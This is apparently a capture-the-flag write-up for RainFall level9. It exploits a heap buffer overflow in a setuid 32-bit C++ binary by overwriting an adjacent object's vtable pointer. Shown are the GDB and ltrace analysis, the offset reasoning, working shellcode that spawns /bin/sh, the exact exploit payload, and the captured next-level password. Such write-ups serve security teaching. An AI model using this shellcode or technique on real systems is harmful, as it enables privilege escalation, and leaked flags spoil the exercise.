# LEVEL9 - C++ Heap Overflow & Virtual Function Pointer Overwrite

> Vulnerability class: Heap Buffer Overflow
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, ltrace, objdump, file

---

## Overview

The program allocates two C++ objects on the heap using `operator new`. The first object holds a 108-byte buffer filled via `memcpy()`. The second object stores a virtual function pointer (vtable pointer) that is called at the end of `main()`. By overflowing the first object's buffer, we overwrite the vtable pointer of the second object, redirecting execution to shellcode injected via an environment variable.

---

```bash
   $ file level9 
   level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```
```bash
      $ checksec --file level9 
      RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
      No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level9
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 Program behavior

```bash
   level9@RainFall:~$ ltrace ./level9 AAAA BBBB
   _Znwj(108, 0xbffff7d4, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008   # first object allocated
   _Znwj(108, 5, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078   # second object allocated (0x70 = 112 bytes later)
   strlen("AAAA")                                                                                                  = 4
   memcpy(0x0804a00c, "AAAA", 4)                                                                                   = 0x0804a00c
```

Two C++ objects of 108 bytes each are allocated. `argv[1]` is copied into the first object's buffer at `0x804a00c` (4 bytes past the object start, after the vtable pointer).

### 2.2 The virtual call

At the end of `main()`, a virtual method is dispatched through the second object's vtable pointer:
```bash
   0x08048682 <+142>:   mov    (%eax),%edx      ; dereference vtable pointer = function address
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx            ; call through vtable = target
```

`eax` holds the second object's address. The program dereferences it to get the vtable pointer, then calls through it. Controlling this pointer means controlling execution.

---

## 3. Vulnerability

`memcpy()` copies `argv[1]` into the first object's buffer with no bounds checking. The two objects sit `0x70` (112) bytes apart on the heap:
```txt
   0x804a008  =  first object  (vtable ptr + 104 bytes buffer)
   0x804a078  =  second object (vtable ptr ← overwrite target)
```

The buffer starts at `0x804a00c` (first object + 4). To reach the second object's vtable pointer at `0x804a078`, we need `0x804a078 - 0x804a00c = 108` bytes of padding, then our fake vtable pointer.

---

## 4. Exploitation

### 4.1 Offset confirmation

With 108 bytes, `eax` starts being corrupted:
```bash
   level9@RainFall:~$ ltrace ./level9 $(python -c 'print "A" * 108')
   [...]
   _ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x41414147, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
   [...]
```
EAX is partially overwritten. With 112 bytes, we get a full control:
```bash
   (gdb) run $(python -c 'print "A" * 112')
   Program received signal SIGSEGV, Segmentation fault.
   0x08048682 in main ()
   (gdb) info registers eax
   eax            0x41414141       1094795585
```
The second object's vtable pointer fully overwritten. Offset to vtable pointer is **108 bytes**.

### 4.2 Attack plan

Since NX is disabled and ASLR is off, we inject shellcode into an environment variable (NOP sled + shellcode) and redirect the virtual call there.

The vtable dispatch works as follows:
```txt
   eax → points to vtable → vtable[0] = function address → called
```

So we need to set up a **fake vtable**: a memory location that itself contains the shellcode address. We use the start of our own input buffer (`0x804a00c`) as the fake vtable, and write the shellcode address as its first 4 bytes:

```txt
   input: [ shellcode_addr (4 bytes) ] [ padding (104 bytes) ] [ 0x804a00c (fake vtable ptr) ]
          ^ fake vtable entry           ^ filler               ^ overwrites obj2 vtable ptr
```

When `mov (%eax), %edx` executes, it reads `0x804a00c` (our fake vtable), dereferences it, gets the shellcode address, and `call *%edx` jumps to our shellcode.

### 4.3 Inject shellcode into environment

```bash
   level9@RainFall:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```


Locate the NOP sled in memory via GDB:
```bash
(gdb) x/2000s environ
→ PAYLOAD at 0xbffffd09, NOP sled begins at 0xbffffd11
→ target address in sled: 0xbffffd39  (middle of the sled for reliability)
```

### 4.4 Payload construction

```
[ shellcode_addr × 27 ] + [ 0x0804a00c ]
  ↑ fake vtable (108 bytes = 27 × 4)    ↑ overwrites obj2 vtable pointer
```

- `\xd9\xfc\xff\xbf` repeated 27 times — fills 108 bytes, first 4 act as the fake vtable entry pointing into our NOP sled
- `\x0c\xa0\x04\x08` — address of the first object's buffer (`0x804a00c`), overwrites the second object's vtable pointer

### 4.5 Execution


```bash
$ ./level9 $(python -c 'print "\xd9\xfc\xff\xbf" * 27 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| C++ vtable dispatch | Virtual calls dereference a vtable pointer stored at the start of each object — a prime overwrite target |
| Heap overflow into vtable | Overflowing one heap object reaches the vtable pointer of an adjacent object |
| Fake vtable technique | Point the overwritten vtable ptr to a controlled buffer whose first 4 bytes are the shellcode address |
| Double dereference | `call *%edx` after `mov (%eax), %edx` — both pointers must be valid and controlled |
| NOP sled reliability | A large NOP sled gives a wide landing zone, compensating for minor address variation between environments |















## Analysis

Let's try to give the code some input to see what's going on:
```bash
   level9@RainFall:~$ ltrace ./level9 AAAA BBBB CCCC
   __libc_start_main(0x80485f4, 4, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff7d4, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAA")                                                                                                  = 4
   memcpy(0x0804a00c, "AAAA", 4)                                                                                   = 0x0804a00c
   _ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                         = 0xb7fce4a0
   +++ exited (status 11) +++

   level9@RainFall:~$ ltrace ./level9 $(python -c 'print "A" * 108')
   __libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                   = 108
   memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 108)                                                  = 0x0804a00c
   _ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x41414147, 0x804a078, 0x8048738, 0x804a00c)                                 = 0xb7fce4a0
   +++ exited (status 71) +++

   level9@RainFall:~$ ltrace ./level9 $(python -c 'print "A" * 109')
   __libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                   = 109
   memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109)                                                  = 0x0804a00c
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

Ok so our input is put as src arg to memcpy and if we give a length of 109 (As in ou case) it segfaults. Let's try to see what
happens in gdb:
```
   (gdb) run $(python -c 'print "A" * 109')
   Program received signal SIGSEGV, Segmentation fault.
   0x54000000 in ?? ()
   (gdb) info registers
   eax            0x804a078        134520952
   ecx            0x41     65
   edx            0x54000000       1409286144
   ebx            0x804a078        134520952
   esp            0xbffff26c       0xbffff26c
   ebp            0xbffff298       0xbffff298
   esi            0x0      0
   edi            0x0      0
   eip            0x54000000       0x54000000
   [...]
   (gdb) bt
   #0  0x54000000 in ?? ()
   #1  0x08048695 in main ()
```
Ok so we corrupted some data including eip, edx, but also ecx where we can find the first "A" after our potential offset.
If we give the exact payload amount we got:
```
   (gdb) run $(python -c 'print "A" * 112')
   eax            0x41414141       1094795585
   ecx            0x41414141       1094795585
   edx            0x804a07c        134520956
   ebx            0x804a078        134520952
   esp            0xbffff270       0xbffff270
   ebp            0xbffff298       0xbffff298
   esi            0x0      0
   edi            0x0      0
   eip            0x8048682        0x8048682 <main+142>
```

But we see something interesting in the code:
```
   0x08048682 <+142>:   mov    (%eax),%edx   <================== LINE1; segfault here
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx         <================== LINE2
```

In LINE1 there is a deference, the value at the address pointed by eax is passed to edx. Then in LINE2,
It is a call to a function whose address is stored in the register edx.

## Solution 

So what we could do is create an env var with a payload containing a shellcode, then with a right offset we could
give as input the address to our payload to be copied where memcpy returns and overflow eax passed to edx with 
memcpy return address. Like this, when the program calls *edx, it would actually go the the memory address that 
points to our shellcode:
```bash
   level9@RainFall:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
   level9@RainFall:~$ ./level9 $(python -c 'print "\xd9\xfc\xff\xbf" * 27 + "\x0c\xa0\x04\x08"')
   $ whoami
   bonus0
   $ cat /home/user/bonus0/.pass
   f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```